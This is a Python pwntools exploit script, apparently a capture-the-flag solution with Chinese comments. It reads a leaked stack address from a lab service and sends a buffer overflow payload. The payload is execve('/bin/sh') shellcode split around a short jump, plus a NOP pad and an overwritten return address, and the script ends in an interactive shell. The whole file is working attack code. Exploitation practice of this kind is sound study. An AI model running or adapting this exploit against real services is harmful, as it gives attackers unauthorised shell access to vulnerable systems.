#!/usr/bin/python
#coding:utf-8

from pwn import *

context.update(arch = 'amd64', os = 'linux', timeout = 1)	

io = remote('172.17.0.3', 10001)	

#shellcode = "\x48\x31\xd2\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05"
#原始的shellcode。由于shellcode位于栈上，运行到push rdi时栈顶正好到了\x89\xe6\xb0\x3b\x0f\x05处，rdi的值会覆盖掉这部分shellcode，从而导致执行失败，所以需要对其进行拆分
#xor rdx, rdx
#mov rbx, 0x68732f6e69622f2f
#shr rbx, 0x8
#push rbx
#mov rdi, rsp
#push rax
#push rdi
#mov rsi, rsp
#mov al, 0x3b
#syscall

shellcode1 = "\x48\x31\xd2\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x50"
#第一部分shellcode，长度较短，避免尾部被push rdi污染
#xor rdx, rdx
#mov rbx, 0x68732f6e69622f2f
#shr rbx, 0x8
#push rbx
#mov rdi, rsp
#push rax

shellcode1 += "\xeb\x18"
#使用一个跳转跳过被push rid污染的数据，接上第二部分shellcode继续执行
#jmp short $+18h

shellcode2 = "\x57\x48\x89\xe6\xb0\x3b\x0f\x05"
#第二部分shellcode
#push rdi
#mov rsi, rsp
#mov al, 0x3b
#syscall

print io.recvuntil("Location:")								#读取到"Location:"，紧接着就是泄露出来的栈地址
shellcode_address_at_stack = int(io.recv()[0:14], 16)		#将泄露出来的栈地址从字符串转换成数字
log.info("Leak stack address = %x", shellcode_address_at_stack)

payload = ""						
payload += shellcode1										#拼接第一段shellcode
payload += "\x90"*(0x28-len(shellcode1))					#任意字符填充到栈中至保存的RIP处，此处选用了空指令NOP，即\x90作为填充字符
payload += p64(shellcode_address_at_stack)					#拼接shellcode所在的栈地址，劫持RIP到该地址以执行shellcode
payload += shellcode2										#拼接第二段shellcode

io.send(payload)
io.interactive()
